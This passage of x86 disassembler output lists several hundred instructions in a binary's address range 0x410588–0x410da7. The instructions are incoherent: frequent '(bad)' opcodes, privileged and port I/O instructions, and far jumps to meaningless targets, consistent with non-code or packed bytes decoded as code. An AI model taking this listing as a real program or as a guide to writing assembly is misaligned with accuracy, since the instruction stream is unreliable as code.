  410588:	jno    0x410531
  41058a:	mov    ah,0x24
  41058c:	xchg   ecx,eax
  41058d:	ret    
  41058e:	mov    ebp,0x2387f6f5
  410593:	lock ret 0x8b2e
  410597:	push   cs
  410598:	dec    esi
  410599:	(bad)
  41059c:	jg     0x4105ee
  41059e:	jle    0x410527
  4105a0:	stos   BYTE PTR es:[edi],al
  4105a1:	jge    0x41057d
  4105a3:	dec    ebp
  4105a4:	sbb    ch,BYTE PTR [esp+ebp*2+0x6705d674]
  4105ab:	lahf   
  4105ac:	pop    ecx
  4105ad:	sub    DWORD PTR [ebx],0x8ca6a495
  4105b3:	cmp    al,0x9
  4105b5:	add    al,0xbf
  4105b7:	fild   QWORD PTR [esp+eiz*2]
  4105ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105bb:	and    DWORD PTR [ebp-0xfda5a15],esi
  4105c1:	add    BYTE PTR [ebx+0x7fc6d66f],bh
  4105c7:	sbb    al,dh
  4105c9:	js     0x410647
  4105cb:	fnstenv [edx+esi*4+0x2e5a1ff4]
  4105d2:	xchg   BYTE PTR [edi],dl
  4105d4:	inc    esi
  4105d5:	shr    DWORD PTR [edx+0x5b],1
  4105d8:	inc    edx
  4105d9:	mov    DWORD PTR [ebp+0x4838a49],edx
  4105df:	call   0x614d:0x4c38f00c
  4105e6:	mov    cl,0xab
  4105e8:	hlt    
  4105e9:	daa    
  4105ea:	ret    
  4105eb:	imul   ecx,DWORD PTR [ebp+eax*1-0x4d],0xffffffe7
  4105f0:	mov    ah,0xeb
  4105f2:	mov    ebp,0x32235e1e
  4105f7:	dec    edx
  4105f8:	std    
  4105f9:	mov    BYTE PTR [edi+edi*4],dh
  4105fc:	lods   al,BYTE PTR ds:[esi]
  4105fd:	cmp    al,0xdd
  4105ff:	jb     0x41061f
  410601:	push   edi
  410602:	mov    edx,0xbfc26052
  410607:	pushf  
  410608:	pcmpgtb mm0,QWORD PTR [edx]
  41060b:	data16 xor BYTE PTR [ecx+0x5e],0xd6
  410610:	mov    ah,0xc0
  410612:	jge    0x4105ae
  410614:	and    cl,BYTE PTR [eax-0xef36f0d]
  41061a:	inc    edi
  41061b:	lea    edi,[ebx]
  41061d:	repnz xcrypt-cfb (bad)
  41061f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410620:	loop   0x410657
  410622:	jbe    0x4105b3
  410624:	enter  0x98df,0x7b
  410628:	and    ch,BYTE PTR [esi+ebx*4+0x54497238]
  41062f:	mov    ah,0xc0
  410631:	fld    QWORD PTR [ebx+0x2e65be29]
  410637:	data16 or dh,BYTE PTR [edx+0x74]
  41063b:	adc    DWORD PTR [ebx+0x1ff85569],esi
  410641:	push   0x73609964
  410646:	cmc    
  410647:	ror    edi,1
  410649:	add    bl,BYTE PTR [ebx+eiz*4]
  41064c:	in     al,dx
  41064d:	or     dl,BYTE PTR [edx]
  41064f:	push   es
  410650:	imul   esi,eax,0xffffffe6
  410653:	jnp    0x4105df
  410655:	hlt    
  410656:	mov    al,0xfc
  410658:	jae    0x410642
  41065a:	adc    al,0xc
  41065c:	shl    BYTE PTR [eax-0x675f0b49],cl
  410662:	imul   eax,DWORD PTR [edx-0x6f966301],0xffffff92
  410669:	sbb    bl,dh
  41066b:	inc    eax
  41066c:	and    al,0xb0
  41066e:	ret    0x9fe5
  410671:	je     0x410686
  410673:	jmp    0x81b2:0x963ccf01
  41067a:	adc    BYTE PTR [esi*1+0xe7db219],0xd9
  410682:	xchg   ecx,eax
  410683:	not    BYTE PTR [edi]
  410685:	in     al,dx
  410686:	push   edx
  410687:	sbb    BYTE PTR [edx],0xbe
  41068a:	push   ecx
  41068b:	xchg   DWORD PTR [ebx-0x61],ebx
  41068e:	xchg   ebp,eax
  41068f:	cli    
  410690:	xor    al,0x51
  410692:	out    0xe3,eax
  410694:	repnz dec edi
  410696:	iret   
  410697:	repnz rep outs dx,DWORD PTR ds:[esi]
  41069a:	addr16 jae 0x4106b9
  41069d:	popa   
  41069e:	imul   edx,DWORD PTR [esp+eax*4-0x69808fd5],0xffffffc2
  4106a6:	push   esi
  4106a7:	lds    eax,FWORD PTR [ecx]
  4106a9:	je     0x4106c4
  4106ab:	push   esp
  4106ac:	or     al,0x87
  4106ae:	mov    BYTE PTR [esi+esi*2+0x2345754f],dh
  4106b5:	xchg   ebp,eax
  4106b6:	or     DWORD PTR [edi-0x3fd7b01d],ebx
  4106bc:	jne    0x410656
  4106be:	inc    ecx
  4106bf:	loope  0x410717
  4106c1:	fcom   st(0)
  4106c3:	mov    cs:0xa9635409,eax
  4106c9:	jns    0x41067f
  4106cb:	sti    
  4106cc:	xchg   edi,eax
  4106cd:	push   ebx
  4106ce:	cmp    al,0x28
  4106d0:	ret    0x461b
  4106d3:	div    BYTE PTR [esi-0x39436c7a]
  4106d9:	cmp    cl,dh
  4106db:	aam    0xf3
  4106dd:	aas    
  4106de:	adc    bh,bh
  4106e0:	hlt    
  4106e1:	scas   al,BYTE PTR es:[edi]
  4106e2:	pusha  
  4106e3:	cld    
  4106e4:	xchg   esp,eax
  4106e5:	out    dx,eax
  4106e6:	lock pop ds
  4106e8:	dec    ebp
  4106e9:	sbb    BYTE PTR [ebp-0x31],0x3c
  4106ed:	adc    edx,DWORD PTR [ebx]
  4106ef:	mov    edx,0xbc9334f3
  4106f4:	sub    eax,DWORD PTR [ebp-0x431f8f53]
  4106fa:	sbb    eax,0xfea74825
  4106ff:	and    eax,0x27a1a10f
  410704:	addr16 mov edx,0xef35d117
  41070a:	aaa    
  41070b:	scas   eax,DWORD PTR es:[edi]
  41070c:	push   ebp
  41070d:	jl     0x4106cd
  41070f:	es inc edi
  410711:	add    edx,esi
  410713:	ins    DWORD PTR es:[edi],dx
  410714:	jmp    0x36f7:0x636920f9
  41071b:	scas   al,BYTE PTR es:[edi]
  41071c:	enterw 0x1cd8,0xb9
  410721:	cmp    bl,al
  410723:	mov    eax,ds:0x170e738a
  410728:	xor    esi,ebx
  41072a:	add    edi,DWORD PTR [ebx-0x7ca86cb6]
  410730:	and    al,dl
  410732:	addr16 aaa 
  410734:	neg    dh
  410736:	(bad)  
  410737:	xchg   esp,eax
  410738:	sub    eax,DWORD PTR ds:0x4705f7d0
  41073e:	pop    ebx
  41073f:	repnz dec eax
  410741:	daa    
  410742:	jae    0x4107a3
  410744:	pop    es
  410745:	mov    eax,0xc74ac202
  41074a:	hlt    
  41074b:	ss mov al,0x6
  41074e:	mov    ah,0x6b
  410750:	das    
  410751:	popf   
  410752:	sub    al,0x9
  410754:	mov    ch,0x7d
  410756:	test   DWORD PTR [edx-0x11db0e14],0x28528d0e
  410760:	sub    eax,0x6732298
  410765:	adc    bl,bh
  410767:	(bad)  
  410768:	xor    DWORD PTR [ecx-0x425b83f4],0x8982a996
  410772:	sahf   
  410773:	mov    ds:0xab54e40,al
  410778:	push   esp
  410779:	xchg   DWORD PTR [ebp-0x11941ed5],esp
  41077f:	dec    edi
  410780:	(bad)  
  410781:	dec    eax
  410782:	add    eax,0x476a9f99
  410787:	lods   al,BYTE PTR ds:[esi]
  410788:	adc    DWORD PTR [esi],eax
  41078a:	out    0x82,eax
  41078c:	adc    eax,DWORD PTR [ebp+0x4c]
  41078f:	sahf   
  410790:	ss mov ecx,0x6b88b0ec
  410796:	cmp    BYTE PTR [ebx],0xc9
  410799:	fisub  WORD PTR [eax+ecx*1+0x32a187db]
  4107a0:	or     ch,BYTE PTR [esp+eiz*2]
  4107a3:	frstor [ecx-0x596c75ba]
  4107a9:	sub    DWORD PTR [esp+ebx*1-0x35cde103],ebp
  4107b0:	js     0x410795
  4107b2:	in     al,dx
  4107b3:	xor    ch,BYTE PTR [edi]
  4107b5:	call   0xbedadcc3
  4107ba:	in     eax,0x41
  4107bc:	ficomp WORD PTR [edi-0x11a05e0c]
  4107c2:	dec    ebx
  4107c3:	(bad)  
  4107c4:	jno    0x410787
  4107c6:	ret    
  4107c7:	cmp    ebx,DWORD PTR [ecx+0x42]
  4107ca:	mov    ds:0x8f226dc,al
  4107cf:	jg     0x410769
  4107d1:	xor    DWORD PTR [ebp+0x78],edi
  4107d4:	fistp  DWORD PTR [edx+0x38fe207b]
  4107da:	jae    0x410812
  4107dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107dd:	xchg   ecx,edi
  4107df:	stos   BYTE PTR es:[edi],al
  4107e0:	(bad)  
  4107e1:	(bad)  
  4107e2:	clc    
  4107e3:	scas   eax,DWORD PTR es:[edi]
  4107e4:	push   edx
  4107e5:	xor    BYTE PTR [esi-0x3e],bl
  4107e8:	adc    ch,BYTE PTR [esi+0x26eeefb8]
  4107ee:	cwde   
  4107ef:	add    DWORD PTR [esi],esp
  4107f1:	(bad)  
  4107f2:	cmp    BYTE PTR [ebp+ebp*8-0x18642b45],0x5f
  4107fa:	pushf  
  4107fb:	ss jg  0x4107bd
  4107fe:	dec    ecx
  4107ff:	pusha  
  410800:	ins    BYTE PTR es:[edi],dx
  410801:	outs   dx,BYTE PTR ds:[esi]
  410802:	mov    ebx,0x6e905093
  410807:	clc    
  410808:	sub    edx,esp
  41080a:	fst    QWORD PTR [edx]
  41080c:	mov    al,0x68
  41080e:	sahf   
  41080f:	adc    al,0x9d
  410811:	dec    ebp
  410812:	icebp  
  410813:	jmp    0x410847
  410815:	sub    dh,BYTE PTR [ebx-0x53032395]
  41081b:	mov    ds:0x44aa3933,al
  410820:	jae    0x4107dc
  410822:	or     DWORD PTR [ecx-0x35],edx
  410825:	call   FWORD PTR [ebp-0x3f799a3c]
  41082b:	push   eax
  41082c:	popf   
  41082d:	and    ch,dh
  41082f:	jmp    0xc0ca:0xcfc0f8d6
  410836:	jp     0x41086a
  410838:	xchg   edx,eax
  410839:	jge    0x4107e9
  41083b:	sbb    al,0x54
  41083d:	dec    ecx
  41083e:	into   
  41083f:	jns    0x4107ea
  410841:	mov    ds:0xd8d20de8,eax
  410846:	xor    BYTE PTR [esi-0x5f],al
  410849:	pop    edi
  41084a:	dec    eax
  41084b:	adc    cl,ch
  41084d:	jl     0x410817
  41084f:	enter  0xdb3f,0x67
  410853:	push   esp
  410854:	sbb    BYTE PTR [ebx+0x61bb5680],dl
  41085a:	scas   al,BYTE PTR es:[edi]
  41085b:	mov    WORD PTR [edi],fs
  41085d:	cmc    
  41085e:	loopne 0x4108ba
  410860:	imul   edx,DWORD PTR [esi+ecx*4],0x97aade87
  410867:	mov    ecx,0x9d5e7559
  41086c:	shl    DWORD PTR [ebx+0x394f5694],0xb2
  410873:	je     0x41082c
  410875:	popa   
  410876:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410877:	nop
  410878:	sub    eax,0x4125de47
  41087d:	pop    ds
  41087e:	rcr    dh,0x88
  410881:	jae    0x410862
  410883:	lds    ebx,FWORD PTR [esi+0x19]
  410886:	fwait
  410887:	push   esp
  410888:	dec    ecx
  410889:	mov    esi,DWORD PTR [esi]
  41088b:	jmp    0x4108b7
  41088d:	int    0x2e
  41088f:	xchg   esp,eax
  410890:	inc    ecx
  410891:	xor    al,0x57
  410893:	dec    ecx
  410894:	stos   BYTE PTR es:[edi],al
  410895:	fsin   
  410897:	inc    edx
  410898:	inc    edx
  410899:	out    dx,al
  41089a:	(bad)  [edi]
  41089c:	outs   dx,DWORD PTR ds:[esi]
  41089d:	mov    ecx,?
  41089f:	test   eax,0x7765838c
  4108a4:	shrd   DWORD PTR [edx+ebx*1+0x6eb1b082],ebp,0x1b
  4108ad:	cmp    eax,0x477e5258
  4108b2:	xor    eax,0x25a81e1f
  4108b7:	dec    edi
  4108b8:	inc    ebx
  4108b9:	mov    ebp,0xab9b0c52
  4108be:	dec    ecx
  4108bf:	mov    bh,0x7c
  4108c1:	dec    ebx
  4108c2:	in     al,0xb1
  4108c4:	aaa    
  4108c5:	call   0x5bb02eda
  4108ca:	les    eax,FWORD PTR [ebp+0xe]
  4108cd:	std    
  4108ce:	add    al,0xf1
  4108d0:	jmp    0xbaf7:0xb76a30d8
  4108d7:	imul   ebx,eax,0x60
  4108da:	cmc    
  4108db:	(bad)  
  4108dc:	sti    
  4108dd:	pop    ebp
  4108de:	or     DWORD PTR [edi+ebx*1],ecx
  4108e1:	call   0xc914:0x74e4e8f1
  4108e8:	and    al,0x6f
  4108ea:	cmp    DWORD PTR [edi],eax
  4108ec:	mov    al,ds:0xf3c4ee69
  4108f1:	lock loopne 0x410931
  4108f4:	fptan  
  4108f6:	cli    
  4108f7:	lds    esp,FWORD PTR [ebx-0x2ebb33df]
  4108fd:	out    0x9b,eax
  4108ff:	leave  
  410900:	gs pop eax
  410902:	(bad)  
  410903:	aam    0x2
  410905:	mov    dl,0x56
  410907:	mov    ebx,0x70979f82
  41090c:	sub    esi,DWORD PTR [ecx+ebx*1]
  41090f:	jnp    0x41096d
  410911:	sahf   
  410912:	out    0x71,al
  410914:	inc    ecx
  410915:	mov    cl,0xc3
  410917:	mov    ds:0xf5eabc98,eax
  41091c:	jmp    0xd87501e0
  410921:	add    edx,esi
  410923:	add    eax,0x386081c4
  410928:	clc    
  410929:	vandps xmm2,xmm0,XMMWORD PTR [edi]
  41092d:	ror    BYTE PTR [ebp+0x37440d2c],1
  410933:	jge    0x410957
  410935:	repnz push ss
  410937:	xor    DWORD PTR [eax-0xf],0x6ca7c075
  41093e:	gs loop 0x4108ed
  410941:	push   es
  410942:	cmp    ecx,0x48c2446b
  410948:	sub    edx,DWORD PTR [edi]
  41094a:	pop    ds
  41094b:	cmp    bh,dh
  41094d:	push   ebp
  41094e:	inc    ebx
  41094f:	push   cs
  410950:	mov    dl,0x71
  410952:	cld    
  410953:	mov    ch,0xed
  410955:	xor    al,BYTE PTR ds:0x28dfb3ec
  41095b:	js     0x4108de
  41095d:	fnstsw WORD PTR [esi+0x32e26a]
  410963:	xor    eax,0x7cb19247
  410968:	ret    
  410969:	test   eax,0x9779e8ac
  41096e:	push   ebp
  41096f:	scas   eax,DWORD PTR es:[edi]
  410970:	push   edx
  410971:	bound  esi,QWORD PTR [esi]
  410973:	pop    ss
  410974:	add    al,0xdf
  410976:	test   BYTE PTR ds:[eax+0x1a5ffef6],cl
  41097d:	push   esp
  41097e:	mov    bh,0x82
  410980:	(bad)  [ecx]
  410982:	in     al,dx
  410983:	adc    dl,BYTE PTR [esp+ebp*4]
  410986:	scas   al,BYTE PTR es:[edi]
  410987:	and    eax,0x37c1a868
  41098c:	jae    0x4109dd
  41098e:	sbb    esi,DWORD PTR [ebp+0x6df1706f]
  410994:	ss or  esi,ebp
  410997:	and    eax,ecx
  410999:	mov    bl,0x43
  41099b:	sti    
  41099c:	cmp    al,0x35
  41099e:	into   
  41099f:	push   edi
  4109a0:	pop    edx
  4109a1:	sbb    eax,0xafb18996
  4109a6:	(bad)  
  4109a7:	stos   DWORD PTR es:[edi],eax
  4109a8:	retf   
  4109a9:	inc    edi
  4109aa:	lds    edi,FWORD PTR [ecx]
  4109ac:	cmp    al,BYTE PTR [ebx+0xe4281e3]
  4109b2:	add    al,0x8d
  4109b4:	mov    eax,DWORD PTR [esi+edx*4-0x7161437f]
  4109bb:	fbstp  TBYTE PTR ds:0xccd00f37
  4109c1:	mov    esi,0xee81b417
  4109c6:	pop    ecx
  4109c7:	mov    eax,DWORD PTR [eax]
  4109c9:	pop    ss
  4109ca:	(bad)  
  4109cb:	retf   
  4109cc:	fdiv   DWORD PTR [ebx]
  4109ce:	(bad)  
  4109cf:	arpl   bx,bx
  4109d1:	std    
  4109d2:	je     0x410969
  4109d4:	adc    eax,0xb2ed6a1b
  4109d9:	popf   
  4109da:	add    al,0xf9
  4109dc:	push   esi
  4109dd:	aaa    
  4109de:	or     ebx,esp
  4109e0:	fcomp  QWORD PTR [eax-0x7e]
  4109e3:	test   eax,0x6ab3b490
  4109e8:	or     al,0xad
  4109ea:	inc    ecx
  4109eb:	imul   edi,edi,0xffffff85
  4109ee:	jge    0x410a1c
  4109f0:	pop    ecx
  4109f1:	aad    0xb7
  4109f3:	(bad)  
  4109f4:	repz sub BYTE PTR fs:[edx],ah
  4109f8:	mov    cl,0xc6
  4109fa:	pusha  
  4109fb:	mov    dl,0x41
  4109fd:	adc    al,0x8f
  4109ff:	push   eax
  410a00:	mov    bh,0x7d
  410a02:	mov    al,0x4e
  410a04:	mov    bl,0x71
  410a06:	dec    ecx
  410a07:	icebp  
  410a08:	and    eax,0xcb07ec51
  410a0d:	pop    ecx
  410a0f:	mov    BYTE PTR [esi+0x5949665b],dl
  410a15:	xchg   esi,ebx
  410a17:	aam    0xc1
  410a19:	fwait
  410a1a:	scas   eax,DWORD PTR es:[edi]
  410a1b:	cmp    edi,DWORD PTR [esi]
  410a1d:	jle    0x410a66
  410a1f:	xchg   ebx,eax
  410a20:	sub    al,cl
  410a22:	je     0x410a60
  410a24:	clc    
  410a25:	push   ds
  410a26:	push   0xffffffa9
  410a28:	and    al,0x7b
  410a2a:	clc    
  410a2b:	jbe    0x410aa0
  410a2d:	pop    ecx
  410a2e:	xchg   ebx,eax
  410a2f:	fist   DWORD PTR [eax+0x12]
  410a32:	mov    esp,0xdbbcb053
  410a37:	mov    ah,0x61
  410a39:	(bad)  
  410a3a:	shl    DWORD PTR [edx-0x2a7b9a17],1
  410a40:	dec    edx
  410a41:	lods   al,BYTE PTR ds:[esi]
  410a42:	and    eax,0x9e6ceb1a
  410a47:	xchg   edx,eax
  410a48:	retf   0xf7bb
  410a4b:	mov    ch,0x5d
  410a4d:	dec    ebp
  410a4e:	gs push 0x39
  410a51:	bound  ebx,QWORD PTR [eax+0x2b4ac615]
  410a57:	and    cl,al
  410a59:	ins    DWORD PTR es:[edi],dx
  410a5a:	call   0x86ac:0x37d836d1
  410a61:	dec    eax
  410a62:	jb     0x410a53
  410a64:	inc    edx
  410a65:	jmp    0x6b2ea33d
  410a6a:	pushf  
  410a6b:	xchg   ah,al
  410a6d:	neg    BYTE PTR [edi-0x6130d43d]
  410a73:	or     al,0xbc
  410a75:	jecxz  0x410a7e
  410a77:	dec    edx
  410a78:	and    BYTE PTR [esi+0x1bcdb7d6],0xf8
  410a7f:	ficom  WORD PTR [ecx]
  410a81:	push   ebp
  410a82:	and    al,0xf9
  410a84:	hlt    
  410a85:	push   0x77d68383
  410a8a:	push   ecx
  410a8b:	push   ds
  410a8c:	pusha  
  410a8d:	mov    ds:0x332fbf8a,eax
  410a92:	mov    dl,0x80
  410a94:	mov    edx,0x1652cea5
  410a99:	cs imul esi,ebx,0x28
  410a9d:	cmp    DWORD PTR [edi],esp
  410a9f:	js     0x410a81
  410aa1:	mov    dl,BYTE PTR [eax-0x17a34f71]
  410aa7:	xor    al,0x95
  410aa9:	mov    bl,0xd3
  410aab:	loop   0x410ac7
  410aad:	enter  0xae98,0x9b
  410ab1:	retf   0x2ee6
  410ab4:	mov    esi,0x8211f21e
  410ab9:	jg     0x410b21
  410abb:	sti    
  410abc:	jl     0x410b0c
  410abe:	daa    
  410abf:	(bad)  
  410ac0:	aas    
  410ac1:	and    BYTE PTR [edi],ch
  410ac3:	pop    esi
  410ac4:	inc    edi
  410ac5:	hlt    
  410ac6:	and    al,0x25
  410ac8:	outs   dx,DWORD PTR ds:[esi]
  410ac9:	pop    ecx
  410aca:	sbb    al,0x9e
  410acc:	xchg   edi,eax
  410acd:	pop    esi
  410ace:	jno    0x410b12
  410ad0:	sbb    dl,bl
  410ad2:	inc    ebp
  410ad3:	jmp    0x42739688
  410ad8:	push   edi
  410ad9:	cmp    al,0x24
  410adb:	enter  0xdf53,0x37
  410adf:	dec    ebx
  410ae0:	cmp    eax,DWORD PTR [ebx+edx*8]
  410ae3:	add    eax,0xbd11433d
  410ae8:	jmp    0xd57a:0xf22718e3
  410aef:	inc    esp
  410af0:	xor    DWORD PTR [esp+eiz*4],ecx
  410af3:	call   0xd256:0xcb616e7a
  410afa:	addr16 mov ss:0xa9b,eax
  410aff:	sub    BYTE PTR [esi],ah
  410b01:	in     eax,dx
  410b02:	addr16 cs bnd ja 0x410ace
  410b07:	mov    al,bh
  410b09:	(bad)  
  410b0a:	jmp    0x6be55397
  410b0f:	mov    ecx,0x2236225e
  410b14:	add    bl,dh
  410b16:	push   0x2e
  410b18:	dec    esp
  410b19:	sub    eax,0xb0784c8a
  410b1e:	adc    esi,DWORD PTR [eax]
  410b20:	sbb    BYTE PTR [ebp+0x1f],cl
  410b23:	pop    esp
  410b24:	fdivr  QWORD PTR [ecx+ebx*4-0x2f]
  410b28:	push   edi
  410b29:	push   ecx
  410b2a:	test   DWORD PTR [edi],0x51278a9a
  410b30:	shl    DWORD PTR [edi+0x28],0xde
  410b34:	(bad)  
  410b35:	daa    
  410b36:	dec    ebx
  410b37:	addr16 xchg esp,eax
  410b39:	aaa    
  410b3a:	ss (bad) 
  410b3c:	jl     0x410ad0
  410b3e:	lods   eax,DWORD PTR ds:[esi]
  410b3f:	js     0x410b82
  410b41:	sub    BYTE PTR [eax],dh
  410b43:	dec    ebp
  410b44:	push   edx
  410b45:	or     al,dh
  410b47:	pop    edx
  410b48:	inc    esi
  410b49:	scas   eax,DWORD PTR es:[edi]
  410b4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b4b:	das    
  410b4c:	adc    dh,0xc0
  410b4f:	mov    esi,0x147f6048
  410b54:	pop    ecx
  410b55:	scas   al,BYTE PTR es:[edi]
  410b56:	jecxz  0x410b3f
  410b58:	addr16 inc esp
  410b5a:	push   0x465133f9
  410b5f:	add    eax,0x5bfc6754
  410b64:	lea    edx,[esi-0x72]
  410b67:	mov    WORD PTR [ebx],cs
  410b69:	push   ebx
  410b6a:	stos   DWORD PTR es:[edi],eax
  410b6b:	xchg   edx,eax
  410b6c:	pop    ds
  410b6d:	ins    DWORD PTR es:[edi],dx
  410b6e:	arpl   WORD PTR ds:0xa884b028,ax
  410b74:	adc    ah,BYTE PTR [ebp+0x37]
  410b77:	add    edx,DWORD PTR [ecx+0x6bfdeb7e]
  410b7d:	pop    es
  410b7e:	shr    ebx,cl
  410b80:	mov    ecx,0x5acc9a15
  410b85:	jge    0x410b64
  410b87:	jle    0x410b5f
  410b89:	push   0x65f20c0a
  410b8e:	cmp    ecx,ebx
  410b90:	fwait
  410b91:	sbb    dl,bh
  410b93:	imul   edx,DWORD PTR ds:0x1b7d2a4c,0xbd91c066
  410b9d:	jg     0x410bf0
  410b9f:	inc    ebp
  410ba0:	call   esp
  410ba2:	aam    0xb8
  410ba4:	mov    ss,eax
  410ba6:	and    edi,DWORD PTR [esi]
  410ba8:	jle    0x410bf2
  410baa:	sbb    eax,0x42b1765e
  410baf:	jb     0x410ba5
  410bb1:	xor    BYTE PTR [ebx],0x41
  410bb4:	jmp    0xe6e32307
  410bb9:	mov    ch,0x7
  410bbb:	in     eax,0x98
  410bbd:	ror    cl,1
  410bbf:	or     esp,0x51799820
  410bc5:	xchg   edx,eax
  410bc6:	cmp    ch,ah
  410bc8:	xchg   esi,eax
  410bc9:	add    ecx,DWORD PTR fs:[ebx]
  410bcc:	js     0x410c12
  410bce:	pop    ebx
  410bcf:	retf   0x4345
  410bd2:	test   eax,0xf92da956
  410bd7:	js     0x410b80
  410bd9:	scas   eax,DWORD PTR es:[edi]
  410bda:	cmp    esp,ecx
  410bdc:	mov    WORD PTR [esi-0x68d66236],gs
  410be2:	es dec ebp
  410be4:	fimul  WORD PTR [eax+0x5aeb7134]
  410bea:	sar    eax,0x69
  410bed:	cmc    
  410bee:	add    DWORD PTR fs:[esi],ecx
  410bf1:	xchg   ebx,eax
  410bf2:	push   0xd85de160
  410bf7:	cwde   
  410bf8:	mov    ebp,fs
  410bfa:	inc    ebp
  410bfb:	mov    ds:0x7f849b9e,eax
  410c00:	fiadd  DWORD PTR [esi+0x1]
  410c03:	outs   dx,DWORD PTR ds:[esi]
  410c04:	jnp    0x410c75
  410c06:	mov    cl,0x60
  410c08:	(bad)  [ebx+0x59]
  410c0b:	test   al,0xe
  410c0d:	pop    ecx
  410c0e:	inc    ebp
  410c0f:	xchg   cl,bl
  410c11:	call   0xf442736
  410c16:	dec    eax
  410c17:	dec    ebp
  410c18:	mov    DWORD PTR [edx],ebx
  410c1a:	cmp    DWORD PTR [ecx-0x7c78d031],ecx
  410c20:	push   ebx
  410c21:	inc    edx
  410c22:	(bad)  
  410c23:	mov    ah,0x9f
  410c25:	std    
  410c26:	mov    ch,BYTE PTR [eax-0x532fb03d]
  410c2c:	loopne 0x410c90
  410c2e:	pushf  
  410c2f:	ins    DWORD PTR es:[edi],dx
  410c30:	frstor [ebp-0xe]
  410c33:	sbb    BYTE PTR [eax-0x3aad61d1],dh
  410c39:	gs (bad) 
  410c3b:	outs   dx,DWORD PTR ds:[esi]
  410c3c:	mov    cl,0x4e
  410c3e:	cmp    al,0x41
  410c40:	out    0x4f,al
  410c42:	dec    edi
  410c43:	pop    esp
  410c44:	pop    esp
  410c45:	push   eax
  410c46:	xchg   edi,eax
  410c47:	add    WORD PTR [ecx],bp
  410c4a:	push   es
  410c4b:	(bad)  
  410c4c:	hlt    
  410c4d:	and    DWORD PTR [ecx-0x53],ecx
  410c50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c51:	or     ah,BYTE PTR [eax-0x56446529]
  410c57:	lock lahf 
  410c59:	push   ss
  410c5a:	xor    eax,0x138fcde8
  410c5f:	fcmovnbe st,st(4)
  410c61:	mov    eax,ds:0x7ad29b89
  410c66:	gs cmp al,0x8e
  410c69:	fadd   DWORD PTR [eax+edx*4+0x55]
  410c6d:	data16 mov bh,0xba
  410c70:	ror    DWORD PTR [ebx-0x6b184094],cl
  410c76:	stos   BYTE PTR es:[edi],al
  410c77:	mov    dl,0x59
  410c79:	push   esi
  410c7a:	or     DWORD PTR [ebp-0x6e799f60],esp
  410c80:	or     ebx,DWORD PTR [esi+0x51]
  410c83:	arpl   dx,bx
  410c85:	adc    BYTE PTR [edi-0x32766bd2],0xa2
  410c8c:	or     eax,0x99e49554
  410c91:	pusha  
  410c92:	xlat   BYTE PTR ds:[ebx]
  410c93:	retf   0x6f8f
  410c96:	or     DWORD PTR [edx],ebx
  410c98:	out    dx,eax
  410c99:	xor    DWORD PTR [ebx+0x723c2e06],0x5f
  410ca0:	mov    edx,0xbff8e7a
  410ca5:	out    0x8f,al
  410ca7:	xchg   esp,eax
  410ca8:	inc    esp
  410ca9:	adc    BYTE PTR [edi+0x2c0c0977],0xab
  410cb0:	inc    edi
  410cb1:	sbb    bl,BYTE PTR [ecx]
  410cb3:	je     0x410cae
  410cb5:	dec    esp
  410cb6:	push   0x5de21c31
  410cbb:	lock jns 0x410d35
  410cbe:	push   edx
  410cbf:	mov    eax,ds:0x39f03398
  410cc4:	add    eax,0xeb97f80
  410cc9:	jmp    0x410cd6
  410ccb:	addr16 mov ebx,0x893cd5c6
  410cd1:	xor    edi,edx
  410cd3:	ficom  WORD PTR [ebx]
  410cd5:	dec    ebp
  410cd6:	lods   eax,DWORD PTR ds:[esi]
  410cd7:	xor    ah,BYTE PTR [esi-0x6d98e479]
  410cdd:	xor    DWORD PTR [ecx],ecx
  410cdf:	pop    ss
  410ce0:	jmp    0x410d43
  410ce2:	and    ebx,DWORD PTR [esi+eax*8-0x75]
  410ce6:	call   0x80e9d3ed
  410ceb:	adc    eax,0xdaf5be77
  410cf0:	loop   0x410c87
  410cf2:	repz pop DWORD PTR [ebp-0x5eb5be9a]
  410cf9:	add    ah,dl
  410cfb:	xor    eax,DWORD PTR cs:[eax]
  410cfe:	sti    
  410cff:	sub    DWORD PTR [edi-0x6e],0x3cd400c6
  410d06:	mov    DWORD PTR [ecx],edx
  410d08:	xor    ecx,DWORD PTR [edi+0x69812b70]
  410d0e:	mov    esp,0x1d707622
  410d13:	(bad)  
  410d15:	add    BYTE PTR [edi-0x56],bl
  410d18:	mov    esp,0x5755dd0b
  410d1d:	pop    es
  410d1e:	jne    0x410d32
  410d20:	sbb    bh,cl
  410d22:	dec    edx
  410d23:	push   esp
  410d24:	jg     0x410d83
  410d26:	mov    eax,edi
  410d28:	in     al,0x95
  410d2a:	cmp    DWORD PTR [esi],0xffffffb4
  410d2d:	ror    DWORD PTR [ebp-0x132b3d5],1
  410d33:	sbb    BYTE PTR [esp+ebp*2],ah
  410d36:	(bad)  
  410d37:	sbb    cl,BYTE PTR [eax-0x3b9ff25c]
  410d3d:	mov    esp,0xa255a45b
  410d42:	cdq    
  410d43:	xor    eax,0x70444bf4
  410d48:	jecxz  0x410d1f
  410d4a:	pop    ecx
  410d4b:	adc    dh,dh
  410d4d:	test   BYTE PTR [esi-0x1e],bl
  410d50:	mov    ecx,0xaeba2a58
  410d55:	jnp    0x410cd9
  410d57:	xchg   esp,eax
  410d58:	cmp    DWORD PTR [eax-0x7e],eax
  410d5b:	jmp    0x6535:0x63e7d278
  410d62:	dec    edx
  410d63:	xor    eax,0x8dd412e4
  410d68:	mov    cl,0x24
  410d6a:	adc    ch,BYTE PTR ds:0x30ad2463
  410d70:	repz pop es
  410d72:	jmp    0x410dc1
  410d74:	fucomip st,st(7)
  410d76:	pushf  
  410d77:	inc    ebp
  410d78:	sub    ch,al
  410d7a:	add    cl,cl
  410d7c:	aad    0x2b
  410d7e:	or     eax,0xbdfaed2b
  410d83:	shl    ebx,0xdd
  410d86:	arpl   WORD PTR [edi],bx
  410d88:	leave  
  410d89:	fidiv  DWORD PTR [eax+0x12e88d77]
  410d8f:	jle    0x410d38
  410d91:	sbb    DWORD PTR [edi-0x7aeba13],0xa3786b13
  410d9b:	(bad)  
  410d9c:	inc    DWORD PTR [esi]
  410d9e:	data16 or cl,dh
  410da1:	pop    edx
  410da2:	mov    BYTE PTR [edx-0x1c],cl
  410da5:	cmp    ch,bh
  410da7:	jmp    0x2785bd32
